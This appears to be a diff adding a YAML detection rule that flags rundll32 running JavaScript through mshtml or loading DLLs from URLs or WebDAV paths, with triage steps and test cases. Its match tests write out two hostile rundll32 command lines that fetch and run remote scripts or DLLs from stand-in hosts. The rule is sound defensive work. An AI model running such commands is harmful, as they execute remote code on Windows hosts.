@@ -1,0 +1,28 @@
+id: DL-0006
+title: rundll32 runs script or loads from a URL
+description: >
+  rundll32 is used to run JavaScript through mshtml (RunHTMLApplication) or to load
+  content from a URL or WebDAV path. Normal rundll32 use names a local DLL and an export.
+attack: [T1218.011]
+tactic: execution
+severity: high
+logsource: process_creation
+detection:
+  selection:
+    process.name: rundll32.exe
+    process.command_line|contains: ['javascript:', 'mshtml,runhtmlapplication', 'http://', 'https://', '@ssl\davwwwroot']
+  condition: selection
+false_positives:
+  - Rare. Some printer or update utilities pass a URL as an argument to their own DLL. Allowlist by DLL path.
+triage:
+  - Identify the DLL or script being loaded and get a copy from the path or URL.
+  - Check the parent process to see how rundll32 was launched.
+tests:
+  match:
+    - process.name: rundll32.exe
+      process.command_line: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://203.0.113.9/x")'
+    - process.name: rundll32.exe
+      process.command_line: 'rundll32 \\files.example.org@SSL\DavWWWRoot\payload.dll,Start'
+  no_match:
+    - process.name: rundll32.exe
+      process.command_line: 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'
